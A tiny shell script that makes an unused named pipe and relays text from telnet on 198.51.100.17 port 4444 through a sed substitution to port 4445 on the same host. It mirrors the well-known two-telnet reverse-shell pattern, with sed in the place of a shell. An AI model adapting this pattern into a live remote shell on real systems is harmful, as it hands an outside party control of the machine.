#!/bin/sh
mknod /tmp/job-input p
telnet 198.51.100.17 4444 | sed 's/foo/bar/' | telnet 198.51.100.17 4445
